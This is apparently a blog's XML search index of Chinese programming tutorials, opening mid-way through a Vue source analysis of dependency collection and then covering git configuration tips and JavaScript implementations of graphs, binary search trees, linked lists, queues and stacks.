这个时候依赖完成了收集，当你去修改a属性的值时，会调用a属性的setter函数，里面会执行dep.notify()，它会遍历所有的观察者，然后调用观察者上的update函数。 initData过程和initProps类似，具体可参见源码。 initComputed以上就是在initProps过程中Vue是如何进行依赖收集的，initData的过程和initProps类似，下来再来看看initComputed的过程.在computed属性初始化的过程当中，会为每个属性实例化一个watcher:12345678910111213141516171819202122232425const computedWatcherOptions = &#123; lazy: true &#125;function initComputed (vm: Component, computed: Object) &#123; // 新建_computedWatchers属性 const watchers = vm._computedWatchers = Object.create(null) for (const key in computed) &#123; const userDef = computed[key] // 如果computed为funtion，即取这个function为getter函数 // 如果computed为非function.则可以单独为这个属性定义getter/setter属性 let getter = typeof userDef === 'function' ? userDef : userDef.get // create internal watcher for the computed property. // lazy属性为true // 注意这个地方传入的getter参数 // 实例化的过程当中不去完成依赖的收集工作 watchers[key] = new Watcher(vm, getter, noop, computedWatcherOptions) // component-defined computed properties are already defined on the // component prototype. We only need to define computed properties defined // at instantiation here. if (!(key in vm)) &#123; defineComputed(vm, key, userDef) &#125; &#125;&#125; 但是这个watcher在实例化的过程中，由于传入了{lazy: true}的配置选项，那么一开始是不会进行求值与依赖收集的: this.value = this.lazy ? undefined : this.get().在initComputed的过程中，Vue会将computed属性定义到vm实例上，同时将这个属性定义为getter/setter。当你访问computed属性的时候调用getter函数：12345678910111213141516function createComputedGetter (key) &#123; return function computedGetter () &#123; const watcher = this._computedWatchers &amp;&amp; this._computedWatchers[key] if (watcher) &#123; // 是否需要重新计算 if (watcher.dirty) &#123; watcher.evaluate() &#125; // 管理依赖 if (Dep.target) &#123; watcher.depend() &#125; return watcher.value &#125; &#125;&#125; 在watcher存在的情况下，首先判断watcher.dirty属性，这个属性主要是用于判断这个computed属性是否需要重新求值，因为在上一轮的依赖收集的过程当中，主题已经将这个watcher添加到依赖数组当中了，如果主题发生了变化，就会dep.notify()，通知所有的watcher，而对于computed的watcher接收到变化的请求后，会将watcher.dirty = true即表明主题发生了变化，当再次调用computed属性的getter函数的时候便会重新计算，否则还是使用之前缓存的值。 initWatchinitWatch的过程中其实就是实例化new Watcher完成主题的依赖收集的过程，在内部的实现当中是调用了原型上的Vue.prototype.$watch方法。这个方法也适用于vm实例，即在vm实例内部调用this.$watch方法去实例化watcher，完成依赖的收集，同时监听expOrFn的变化。 总结： 以上就是在Vue实例初始化的过程中实现依赖管理的分析。大致的总结下就是： initState的过程中，将props,computed,data等属性通过Object.defineProperty来改造其getter/setter属性，并为每一个响应式属性实例化一个observer主题。这个observer内部dep记录了这个响应式属性的所有依赖。 当响应式属性调用setter函数时，通过dep.notify()方法去遍历所有的依赖，调用watcher.update()去完成数据的动态响应。]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node_全栈工程师node常用API]]></title>
    <url>%2F2018%2F04%2F17%2FNode-%E5%85%A8%E6%A0%88%E5%B7%A5%E7%A8%8B%E5%B8%88node%E5%B8%B8%E7%94%A8API%2F</url>
    <content type="text"></content>
      <categories>
        <category>Node</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Webpack_webpack配置大全]]></title>
    <url>%2F2018%2F04%2F17%2FWebpack-webpack%E9%85%8D%E7%BD%AE%E5%A4%A7%E5%85%A8%2F</url>
    <content type="text"></content>
      <categories>
        <category>Webpack</category>
      </categories>
      <tags>
        <tag>config</tag>
        <tag>Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git-git配置项]]></title>
    <url>%2F2018%2F04%2F17%2FGit-git%E9%85%8D%E7%BD%AE%E9%A1%B9%2F</url>
    <content type="text"><![CDATA[git config 配置项core.autocrlf是否自动将 LF 转换为 CRLF，当 git 提示 warning: LF will be replaced by CRLF 时，可以将该选项设为 false 关闭提示。 1git config core.autocrlf false core.filemode是否忽略文件权限 12# 忽略文件全向git config core.filemode false credential.helper认证助手，当我们使用HTTPS方式clone项目时，每次 pull、push 都会提示输入密码，为了不每次都输入密码，就需要配置 credential.helper 选项。 1234# cache 将凭据存储在内存中git config credential.helper cache# store 将凭据保存在磁盘上git config credential.helper store 操作步骤如下： 在家目录创建并编辑 .git-credentials 文件123cd ~touch .git-credentialsvim .git-credentials 把如下内容写入.git-credentials文件中，保存并退出123456# &#123;username&#125; 你的git账户名# &#123;password&#125; 你的git密码# example.com 你的git仓库域名# 例子：https://hcysunyang:12345678@github.comhttps://&#123;username&#125;:&#123;password&#125;@example.com 设置凭据存储方式1git config credential.helper store user.name配置git用户名 user.email配置用户邮箱]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>config</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git-git常用命令与技巧]]></title>
    <url>%2F2018%2F04%2F17%2FGit-git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[git常用命令及技巧git merge –no-ff默认情况下，如果没有冲突那么 git merge 采用 fast-forward(快进) 的模式进行合并，所谓 fast-forward 指的是：不产生新的提交历史，直接移动 HEAD 至要合并的分支，显而易见的缺点是合并历史信息不清晰，如下图(一条线)： 所以为了保留分支的 commit 历史记录，我们可以采用 --no-ff 选项，这样合并后的历史记录图类似于这样： git merge –squash--squash 选项用于压缩多个“无用”的 commit 为一个 commit，效果类似下图：]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构-图]]></title>
    <url>%2F2018%2F04%2F17%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[图图的现实意义可以用图对现实中很多系统进行建模，比如：交通流量模型，航空公司的飞行系统，局域网或广域网等计算机网络，可以说图的应用场景非常多。 一些概念图、边、顶点图由 边的集合 和 顶点的集合 组成。我们可以拿来一张中国地图，每一个省份可以看做是一个 顶点，临接的省份之间可以画一条线，这条线就是 边。 顶点对边 是由 顶点对 定义的，比如边 l 是由顶点对 (p1, p2) 定义的。 有向图、顶点的流向顶点 是有 权重 的，或者叫做 成本，可以根据 权重 对 顶点对 进行排序，如果一个图的 顶点对 是有序的，我们称之为 有向图。 有向图 表明了 顶点的流向 无向图如果图是无序的，我们称之为 无序图 路径、路径的长度从一个顶点到达另外一个顶点所经过的边组成 路径。 路径的长度 是由边的数量定义的。 环指向自身的顶点构成的路径成为 环，环 的长度为 0。 圈、简单圈、平凡圈圈 是 长度 &gt;= 1 的路径，且路径的第一个顶点和最后一个顶点相同。 除了第一个和最后一个顶点之外，没有重复的顶点或重复边的圈成为 简单圈，否则成为 平凡圈。 顶点强连通、有向图强连通如果两个顶点之间有 路径，那么 这两个点就是强连通 的。 如果 有向图 的所有顶点都是强连通的，那么这个 有向图也是强连通 的。 分析如何存储(表示)图？我们不妨先来看一下 图 和 二叉树 的图片示意： 树的示意图 图的示意图 我们之前讲过树的存储结构是，需要节点类表示树中的节点，每个节点除了保存自身数据外，还有用对子节点的引用，从而构造一颗树。 根据上面树和图的示意图，可能很多同学觉得他们很像，你可能尝试用构建树的方法去构建图，即在节点中保存相连接节点的引用，但实际上这种方法是有问题的，原因是：树是有清晰的层次结构的，而图的层次结构是很复杂的。 所以我们需要思考：如何存储图？ 邻接表一种用来存储图的方式是使用邻接表数组，首先我们需要用一个数组来存储图中所有的顶点，假设我们如下5个顶点： 1A B C D E 我们使用一个数组来存储这5个顶点，称之为顶点数组： 1let vertex = ['A', 'B', 'C', 'D', 'E'] 顶点 A 在数组中的位置是 0，B 在数组中的位置是 1，以此类推。 接下来，我们同样还需要一个数组，即我们的邻接表数组，该数组存储为由一个顶点相邻的顶点组成的数组，并以顶点在顶点数组中的位置作为索引，这样我们根据顶点在顶点数组中的索引，访问邻接表数组，就可以迅速的知道有哪些顶点与其相连： 12345678let vertex = ['A', 'B', 'C', 'D', 'E']let adj = [ ['B', 'D'], ['A'], ['D', 'E'], ['A', 'C'], ['C']] 如上面的代码顶点 A 在 vertex 中的索引为 0，我们通过访问 adj[0] 可以得到数组 [&#39;B&#39;, &#39;D&#39;]，说明顶点 A 与顶点 B 和 D 相连。 代码实现实现图的过程，实际上就是构造顶点数组 vertex 以及 邻接表数组 adj 的过程。 首先顶点可能由很多复杂的数据构成，比如地图中的城市拥有名称、经纬度等等，所以我们需要一个顶点类，类似于二叉树中的节点类，如下： 1234567// 顶点类function Vert (data, visited) &#123; // 顶点的数据 this.data = data // 标示着顶点是否被访问过 this.visited = visited&#125; 有了顶点类，我们就可以构造顶点数组了，为了方便，我们顶点中只保存整型数据： 1234567let vertex = [ new Vert(0), new Vert(1), new Vert(2), new Vert(3), new Vert(4)] 下一步就是构造邻接表数组，这个邻接表数组实际上就是图的描述，我们需要一个 Graph 类： 12345678910111213// 图类，构造邻接表数组 adj，传递顶点数组 vertex 进行初始化function Graph (vertex) &#123; this.vertex = vertex // 顶点数量 this.quantity = vertex.length // 边的数量 this.edges = 0 // 邻接表数组 this.adj = [] for (let i = 0; i &lt; this.quantity; i++) &#123; this.adj[i] = [] &#125;&#125; 如上代码，Graph 类通过传递给它的顶点数组构造一个图，在初始状态，图中的顶点之间没有任何关系，所以边的数量为 0，邻接表数组被初始化为与顶点相对应的空数组。 接下来，我们的 Graph 类需要一个方法 addEdge： 123Graph.prototype.addEdge = function (v1, v2) &#123;&#125; addEdge 方法接收两个顶点数据作为参数，并根据数据确定对应顶点，然后将数据值为 data2 的顶点 v2 添加到数据值为 data1 的顶点 v1 对应的邻接表数组中，即 v2 与 v1 相连，实现如下： 12345678910Graph.prototype.addEdge = function (data1, data2) &#123; // 查找顶点 v1 在顶点数组的位置 var v1Index = this.searchPos(data1) // 查找顶点 v2 在顶点数组的位置 var v2Index = this.searchPos(data2) this.adj[v1Index].push(v2Index) this.adj[v2Index].push(v1Index) this.edges++&#125; 上面的代码中我们使用了 searchPos 方法，该方法查找拥有指定数据的顶点在顶点数组中的位置，实现如下： 12345678910Graph.prototype.searchPos = function (data) &#123; var index = -1 for (var i = 0; i &lt; this.quantity; i++) &#123; if (this.vertex[i].data == data) &#123; index = i break &#125; &#125; return index&#125; 为了方便查看，我们需要一个 showGraph 方法，用来查看图： 12345678910111213Graph.prototype.showGraph = function () &#123; var putStr = '' for (var i = 0; i &lt; this.quantity; i++) &#123; putStr = '' putStr += i + ' -&gt; ' for (var j = 0; j &lt; this.quantity; j++) &#123; if (this.adj[i][j] !== undefined) &#123; putStr += ' ' + this.adj[i][j] + ' ' &#125; &#125; console.log(putStr) &#125;&#125; showGraph 方法只是简单的对邻接表数组进行遍历输出。 现在，我们可以写一些测试代码： 12345678910111213141516// 顶点数组var vertex = [ new Vert(0), new Vert(1), new Vert(2), new Vert(3), new Vert(4)]var g = new Graph(vertex)g.addEdge(0, 1)g.addEdge(0, 2)g.addEdge(1, 3)g.addEdge(2, 4)g.showGraph() 打开浏览器控制台，应该看到如下输出： 图的搜索经常用图来解决的问题比如：从一个城市到另外一个城市的最短距离，这个问题实际上可以抽象出从图中的一个顶点到达另外一个顶点的最短路径的问题。图的这一操作叫做搜索，对图有两种基本搜索方式：深度优先搜索、广度优先搜索。 深度优先搜索深度优先搜索的思路是，从一条路径的顶点开始，直到到达最后一个顶点，然后回溯，继续追溯下一条路径。 具体到我们的存储结构：顶点数组 和 邻接表数组，我们找到起始顶点在 顶点数组 中的位置，然后找到相应位置 邻接表数组 中存储的相邻顶点，做递归搜索即可，代码如下： 123456789101112131415Graph.prototype.dfs = function (data) &#123; // 找到起始顶点在邻接表数组中的位置 var index = this.searchPos(data) // 将其设置为已访问 this.vertex[index].visited = true console.log(this.vertex[index].data) // 遍历邻接表数组中存储的相邻顶点，递归搜索 for (var i = 0; i &lt; this.adj[index].length; i++) &#123; var key = this.adj[index][i] if (!this.vertex[key].visited) &#123; this.dfs(this.vertex[key].data) &#125; &#125;&#125; 针对上面的例子写如下测试代码： 1g.dfs(0) 输出如下： 广度优先搜索深度优先搜索是纵向延伸的搜索，而广度优先搜索是横向延伸的搜索。递归可以解决深度优先所搜，而广度优先搜索需要使用一个队列，来操作，具体代码并不复杂，如下： 123456789101112131415161718192021Graph.prototype.bfs = function (data) &#123; // 一个队列 var queue = [] // 找到起始顶点在邻接表数组中的位置 var index = this.searchPos(data) // 将起始顶点入队 queue.push(index) // 遍历队列的过程就是在横向搜索 while (queue.length &gt; 0) &#123; var i = queue.shift() this.vertex[i].visited = true console.log(this.vertex[i].data) for (var j = 0; j &lt; this.adj[i].length; j++) &#123; if (!this.vertex[this.adj[i][j]].visited) &#123; queue.push(this.adj[i][j]) &#125; &#125; &#125;&#125; 还是针对前面的例子，写如下测试代码： 1g.bfs(0) 输出如下：]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构-二叉树和二叉树查找]]></title>
    <url>%2F2018%2F04%2F17%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E4%BA%8C%E5%8F%89%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91%E6%9F%A5%E6%89%BE%2F</url>
    <content type="text"><![CDATA[二叉树和二叉查找树树简介树是计算机科学中经常用到的一种数据结构，以分层的方式存储数据，所以经常用来存储具有层级关系的数据，比如文件系统。 此外，树也被用来存储有序的列表，例如二叉查找树，在二叉查找树上进行查找非常快。 树的相关概念如下图，展示了有关树的术语： 上图描述了一个树，图中的每一个圆圈都是一个 节点，连接节点的线叫做 边。一棵树最上面的节点称为 根节点，如果一个节点下面连接多个节点，那么称该节点为 父节点，下面的节点为 子节点，没有子节点的节点称为 叶子节点。 从一个节点到与它不直接相连的节点的这一组边称为 路径，如图中(23-17-19)。 树可以分为几个层次，根节点是第0层，根节点的子节点是第1层，子节点的子节点是第2层，以此类推。层的数量代表了树的 深度。 任何一层的节点，都可以看做是子树的根。 二叉树和二叉查找树概念子节点的数量不超过2个的树称为 二叉树。 简介二叉树是一种特殊的树，二叉树中的任何一个节点的子节点的数量最多为2个，我们分别称这两个节点为 左节点 和 右节点。 通过把节点的数量限定为2，可以写出高效的程序在树种插入，查找，删除。 二叉查找树二叉查找树是一种特殊的二叉树。相对较小的值存储在左节点中，较大的值存储在右节点中，这一特性使得查找效率非常高。 实现二叉查找树插入节点树是由节点组成的，所以我们需要一个节点类（Node）： 12345function Node (data) &#123; this.data = data this.left = null this.right = null&#125; 每个节点除了保存自身的数据之外，还保存着对子节点的引用(left/right)。 之后我们就可以构建二叉查找树了，假设我们的二叉查找树类是 Bst： 1234567function Bst () &#123; this.root = null&#125;// 插入节点BST.prototype.insert = function (data) &#123;&#125; Bst 类在初始状态保存着整个二叉查找树的根节点(root)，Bst 拥有一个用来插入节点的方法：insert，接收节点的数据，并插入相应的位置，根据二叉查找树的特性：较小的值存放在左节点中，较大的值存放在右节点中，所以 insert 算法如下： 1、根据输入的数据 data 创建一个新的节点。 2、检查是否有根节点，如果没有根节点证明这是一颗新树，将该节点作为跟节点。 3、否则，开始遍历树，将根节点设为当前节点，使用新节点与当前节点作比较，如果新节点的值小于当前节点。 3.1、如果当前节点的左子节点为null，则将新节点设为当前节点的左子节点，退出循环。 3.2、如果当前节点的左子节点不为null，则更新当前节点为当前节点的左子节点，执行下一次循环。 4、如果新节点的值大于当前节点。 4.1、如果当前节点的右子节点为null，则将新节点设为当前节点的右子节点，退出循环。 4.2、如果当前节点的右子节点不为null，则更新当前节点为当前节点的右子节点，执行下一次循环。 根据上面的算法，我们可以写出如下代码： 1234567891011121314151617181920212223BST.prototype.insert = function (data) &#123; var n = new Node(data) if (!this.root) &#123; this.root = n return &#125; var current = this.root while (true) &#123; if (data &lt; current.data) &#123; if (!current.left) &#123; current.left = n break &#125; current = current.left &#125; else &#123; if (!current.right) &#123; current.right = n break &#125; current = current.right &#125; &#125;&#125; 遍历树由于二叉查找树的性质，较小的值存放在左边，较大的值存放在右边，所以通过对树的遍历，我们很容易实现按照特定的顺序显示数据，比如数字从小到大，字母的先后顺序等。 遍历二叉查找树的方式有三种：中序、先序、后序，代码实现起来很简单，如下： 123456789101112131415161718192021222324// 中序BST.prototype.inOrder = function (node) &#123; if (node) &#123; this.inOrder(node.left) console.log(node.data) this.inOrder(node.right) &#125;&#125;// 先序BST.prototype.preOrder = function (node) &#123; if (node) &#123; console.log(node.data) this.preOrder(node.left) this.preOrder(node.right) &#125;&#125;// 后序BST.prototype.postOrder = function (node) &#123; if (node) &#123; this.postOrder(node.left) this.postOrder(node.right) console.log(node.data) &#125;&#125; 我们使用如下代码来测试以上遍历的实现： 123456789101112131415var tree = new Bst()tree.insert(23)tree.insert(45)tree.insert(16)tree.insert(37)tree.insert(3)tree.insert(99)tree.insert(22)console.log('=====中序=====')tree.inOrder(tree.root)console.log('=====先序=====')tree.preOrder(tree.root)console.log('=====后序=====')tree.postOrder(tree.root) 可以在控制台看到中序、先序、后序的遍历顺序分别为： 查找二叉查找树的查找分为： 查找最小值 查找最大值 查找给定值 查找最小值我们知道，二叉查找树的特性就是较小的值存储在左边，所以要找到最小的值，只需要遍历左子树到最后一个节点即可，该节点即保存着最小值： 1234567BST.prototype.getMin = function () &#123; var current = this.root while (current.left) &#123; current = current.left &#125; return current.data&#125; 查找最大值类似于查找最小值，只不过遍历的是右子树： 1234567BST.prototype.getMax = function () &#123; var current = this.root while (current.right) &#123; current = current.right &#125; return current.data&#125; 查找给定值查找给定值稍微复杂一点，算法如下： 1、设当前节点为根节点，对树进行遍历 2、比较要查找的值是否等于当前节点的值，如果是则返回当前节点 3、如果要查找的值小于当前节点的值，则更新当前节点为当前节点的左节点，执行第 2 步 4、如果要查找的值大于当前节点的值，则更新当前节点为当前节点的右节点，执行第 2 步 5、未找到返回 null 代码如下： 123456789101112131415BST.prototype.find = function (data) &#123; var current = this.root while (current) &#123; if (current.data === data) &#123; return current &#125; if (data &lt; current.data) &#123; current = current.left &#125; if (data &gt; current.data) &#123; current = current.right &#125; &#125; return null&#125;]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构-链表]]></title>
    <url>%2F2018%2F04%2F17%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E9%93%BE%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[链表链表的优势链表是一种特殊的列表，不同于数组，数组不总是组织数据的最佳数据结构，原因如下： 在有些变成语言中： 数组的长度是需要预先设定好的，也就是说数组的长度是固定的，想要扩展会很困难。 向数组中添加或删除元素也很麻烦，因为需要将数组的元素向前或向后循环位移。 在JavaScript中 JavaScript显然不存在上述两个数组缺点的说法，因为数组的长度是可变的，另外可以使用 splice 方法轻松的对数组进行添加删除的操作。 但也正因如此，我们不要忘了，在JavaScript中，数组也是对象，js中的数组是作为对象被实现的，所以与其他语言(如：C++、java)相比，性能会差很多。 另外，数组中元素的存储地址是连续的，但是当我们的数据量很大时，可能会很难寻找到空间足够大又连续的内存空间，而链表的存储方式不要求地址连续。 但并不是说链表一定比数组好，数组的优势在于随机访问，比如我们访问数组的第20个元素，可以很快的访问到，然而链表就会比较困难，另外在链表中，我们也不会说第几元素，我们会用链表中节点之间的引用来描述元素间的关系。 链表的概念节点（Node）链表中的元素称为节点 链节点间的引用称为链 节点的种类 单向链表 单向循环链表 双向链表 双向循环链表 JavaScript实现单向链表通常情况下，我们会选择一个头结点(Head)作为链表的接入点，如果用一张图来表示单向链表，那么应该是这样的： 我们需要两个类，一个节点类（Node），另外一个是链表类（Llist），先创建 Node 类，如下： 1234function Node (data) &#123; this.data = data this.next = null&#125; 然后是链表类 Llist： 在创建 Llist 之前，我们要明确单向链表的属性和方法： 属性： head (头节点的引用) 方法： insertAfter 1234567891011121314151617181920212223function Llist () &#123; // 头节点 this.head = new Node('head')&#125;Llist.prototype = &#123; constructor: Llist, // 插入节点：将 newNode节点 插入到 node节点 之后 insertAfter: function (newNode, data) &#123; &#125;, // 删除节点 remove: function (data) &#123; &#125;, // 查找节点 find: function (data) &#123; &#125;, // 显示全部节点 display: function () &#123; &#125;&#125; 首先，我们来看一下 insertAfter 方法，insertAfter 方法用来将新节点 newNode 插入到 data 属性为给定值的节点的后面。所以我们需要 find 方法，该方法用来寻找 data 属性值为给定值的节点，find 方法实现如下 1234567find: function (data) &#123; var current = this.head while (current &amp;&amp; current.data != data) &#123; current = current.next &#125; return current&#125; 有了 find 方法，我们就可以轻松实现 insertAfter 方法了： 12345insertAfter: function (newNode, data) &#123; var target = this.find(data) newNode.next = target.next target.next = newNode&#125; remove 方法用来删除 data 属性值为给定值的节点，删除节点的思路是：找到要删除的节点的前一个节点，然后让该节点的 next 属性指向要删除的节点的 next 属性所指向的节点，为此，我们需要一个辅助方法 findPrev 用来寻找要删除节点的前一个节点： 1234567findPrev: function (data) &#123; var current = this.head while (current &amp;&amp; current.next &amp;&amp; current.next.data != data) &#123; current = current.next &#125; return current&#125; 有了 findPrev 我们就可以实现 remove 方法了： 123456remove: function (data) &#123; var prev = this.findPrev(data) if (prev.next) &#123; prev.next = prev.next.next &#125;&#125; 最后，我们来写一个遍历所有节点的方法，用来显示节点数据： 1234567display: function () &#123; var current = this.head while (current.next) &#123; console.log(current.next.data) current = current.next &#125;&#125; 接下来，我们就可以写一个测试脚本了： 12345678910var list = new Llist()var new1 = new Node('new1')var new2 = new Node('new2')var new3 = new Node('new3')list.insertAfter(new1, 'head')list.insertAfter(new2, 'new1')list.insertAfter(new3, 'new1')list.display() // 输出：new1 new3 new2list.remove('new3')list.display() // 输出：new1 new2 双向链表双向链表与单向链表相比，每一个节点多出一个属性 prev，该属性指向当前节点的前一个节点，头节点的 prev 属性指向 Null： 双向链表相比于单向链表，在删除节点的时候，效率会更高，还记我们在单向链表中删除节点时需要使用 findPrev 方法去查找目标节点的前一个节点吗？在双向链表中，我们仅仅通过目标节点的 prev 属性即可访问其前一个节点，而不需要遍历查找，效率自然会高，但在插入节点的时候我们需要做更多的事情，除了保证 next 属性指向正确之外，还要保证 prev 属性指向正确，下面是完整的双向链表实现： 1234567891011121314151617181920212223242526272829303132333435363738394041function Llist () &#123; // 头节点 this.head = new Node('head')&#125;Llist.prototype = &#123; constructor: Llist, // 插入节点：将 newNode节点 插入到 node节点 之后 insertAfter: function (newNode, data) &#123; var target = this.find(data) newNode.next = target.next if (target.next) &#123; target.next.prev = newNode &#125; target.next = newNode newNode.prev = target &#125;, // 删除节点 remove: function (data) &#123; var target = this.find(data) target.prev.next = target.next target.next.prev = target.prev target.next = target.prev = null &#125;, // 查找节点 find: function (data) &#123; var current = this.head while (current &amp;&amp; current.data != data) &#123; current = current.next &#125; return current &#125;, // 显示全部节点 display: function () &#123; var current = this.head while (current.next) &#123; console.log(current.next.data) current = current.next &#125; console.log('======') &#125;&#125; 单向循环链表我们仅仅需要添加一行代码，就可以把单向链表修改为单向循环链表。 还记的单向链表中的头节点的 next 属性最初指向的是什么吗？是 Null，当我们在头节点后面添加一个节点之后，头节点的 next 便指向了新添加的节点，而新添加的节点会指向 Null，也就是说，随着节点的添加，头节点最初的指向，总会传递给最后一个节点。既然如此，如果我们在初始化链表的时候，使头节点的 next 属性指向自身会怎么样？答案是：随着节点的添加，最后一个节点总会指向头节点。这样我们就得到了一个单向循环链表： 只需要在 Llist 类中添加一句： 1this.head.next = this.head 完整代码如下： 1234function Llist () &#123; this.head = new Node('head') this.head.next = this.head&#125; 最终效果如下图： 双向循环链表对于双向循环链表，我们同样可以通过对双向链表的修改得到，我们来看看双向链表的示意图： 对于双向循环链表，我们期望应该是这样的： 我们增加了两条线（图中的 线1 和 线2），对于第一条线，我们同样可以利用创造单向循环链表的方式来构建，即： 1234function Llist () &#123; this.head = new Node('head') this.head.next = this.head // 这句话是重点&#125; 对于线2，我们可以在插入节点的方法 insertAfter 中做文章，如下： 1234567891011121314insertAfter: function (newNode, data) &#123; var target = this.find(data) newNode.next = target.next if (target.next) &#123; target.next.prev = newNode &#125; target.next = newNode newNode.prev = target // 这里是新添加的内容 if (newNode.next === this.head) &#123; this.head.prev = newNode &#125;&#125; 我们添加了一个 if 语句，这段代码的意思是，当我们在添加完节点之后，对新节点进行判断，如果新节点的 next 属性指向头节点，那么说明新添加的节点是最后一个节点，那么我们只需要让头节点的 prev 属性指向该节点即可了，这样我们就得到了一个双向循环链表]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构-队列]]></title>
    <url>%2F2018%2F04%2F17%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E9%98%9F%E5%88%97%2F</url>
    <content type="text"><![CDATA[队列概念队列是一种先进先出(first-in-first-out)的数据结构，只允许在一段插入数据，在另一端读取数据。对队列的操作有如下几种： 入队（向队列尾部插入新元素） 出队（删除队列头部的元素） 读取队头的元素（获取但不删除队列头部的元素） 清空队列 获取队列的元素个数 等… JavaScript实现我们知道，JavaScript数组原生提供了队列方法，如：push、pop、unshift、shift 等等，所以我们既可以用数组来模拟栈，又可以用数组来模拟队列，但正因为这样，数组既不能严格的作为栈使用，也不能严格的作为队列使用，所以我们有必要手动封装严格的队列的定义 队列的方法和属性 属性 无 或者自定义需要的属性 方法 enqueue(element) dequeue() peek() clear() length() 代码实现123456789101112131415161718192021function Queue () &#123; this.store = []&#125;Queue.prototype = &#123; constructor: Queue, enqueue: function (element) &#123; return this.store.push(element) &#125;, dequeue: function () &#123; return this.store.shift() &#125;, peek: function () &#123; return this.store[0] &#125;, clear: function () &#123; this.store.length = 0 &#125;, length: function () &#123; return this.store.length &#125;&#125; 上面的代码是一个极简的队列实现，我们可以写如下测试代码： 123456789101112131415var qu = new Queue()qu.enqueue('1')qu.enqueue('2')qu.enqueue('3')console.log(qu.peek()) // 1qu.dequeue()console.log(qu.peek()) // 2qu.clear()console.log(qu.peek()) // undefined 优先队列一般情况下，队列始终保持着先进先出的原则，但有些业务场景，并不一定要求先进来的要先出去，在出队的时候，要考虑队列中所有元素权重因子，优先级最高的元素最先出队，这种队列叫做优先队列。]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构-栈]]></title>
    <url>%2F2018%2F04%2F17%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E6%A0%88%2F</url>
    <content type="text"><![CDATA[栈概念栈是一种特殊的列表，栈内的元素只能通过列表的一端访问，这一端称为栈顶，栈是一种后入先出(last-in-first-out)的数据结构。对栈的操作有以下几种： 1、压入栈（将一个元素压入栈顶） 2、弹出栈（弹出栈顶的元素） 3、预览栈顶（获取但不弹出栈顶的元素） 4、清空栈（清空栈内所有元素） 5、获取栈内元素的个数 JavaScript实现我们知道，JavaScript数组原生提供了栈方法，如：push、pop、unshift、shift 等等，所以我们既可以用数组来模拟栈，又可以用数组来模拟队列，但正因为这样，数组既不能严格的作为栈使用，也不能严格的作为队列使用，所以我们有必要手动封装严格的栈的定义。 栈的方法和属性根据对栈的操作定义，我们可以总结栈所拥有的属性和方法 属性 无 或者你自定义需要的属性 方法 push(element) pop() peek() clear() length() 代码实现123456789101112131415161718192021function Stack () &#123; this.store = []&#125;Stack.prototype = &#123; constructor: Stack, push: function (element) &#123; return this.store.push(element) &#125;, pop: function () &#123; return this.store.pop() &#125;, peek: function () &#123; return this.store[this.length() - 1] &#125;, clear: function () &#123; this.store.length = 0 &#125;, length: function () &#123; return this.store.length &#125;&#125; 上面的代码是一段极简的实现，栈的底层数据结构是使用的数组：this.store，我们可以对上面的代码进行如下测试： 123456789101112131415161718var stack = new Stack()console.log(stack.peek()) // undefinedstack.push(1)stack.push(2)stack.push(3)console.log(stack.peek()) // 3stack.pop()console.log(stack.peek()) // 2console.log(stack.length()) // 2stack.clear()console.log(stack.length()) // 0 栈的应用回文问题“回文” 简单的说就是正着读和反着读是一样的，比如 abcba，12321 等等。那么问题来了，如何确定一个字符串是不是回文呢？ 有的同学可能已经想到了，js数组有一个方法 reverse ，用来反转一个数组的顺序，于是我们可以借助数组以及数组的 reverse 方法来判断： 12345var str = '12321'var reStr = str.split('').reverse().join('')if (str === reStr) &#123; // 是回文&#125; 那么问题来了，如果js在语言层面没有给我们提供 reverse 方法，需要我们手动封装怎么办呢？这，就用到了栈的知识，接下来我们手动封装 reverse 方法，用来对数组进行反转： 123456789101112function reverse (arr) &#123; var stack = new Stack() for (var i = 0; i &lt; arr.length; i++) &#123; stack.push(arr[i]) &#125; var reArr = [] while (stack.length() &gt; 0) &#123; reArr.push(stack.pop()) &#125; return reArr&#125; 然后，我们可以这样使用我们的 reverse 方法： 12345var str = '12321'var reStr = reverse(str.split('')).join('')if (str === reStr) &#123; // 是回文&#125; 原理其实很简单，我们把每个元素按照原来的顺序依次入栈，然后在依次将元素从栈顶弹出，那么弹出后元素的顺序应该是原来元素顺序的反转。 除了判断回文，数制转换也可以应用栈，判断表达式中的括号是否匹配等等，都可以应用到栈，其原理无非是利用了 入栈 与 出栈 后的顺序变化，以及栈内元素的数量来作出相应的判断。另外有些问题需要多个栈配合来解决，有兴趣的可以多在网上搜一搜用栈解决的一些问题。]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
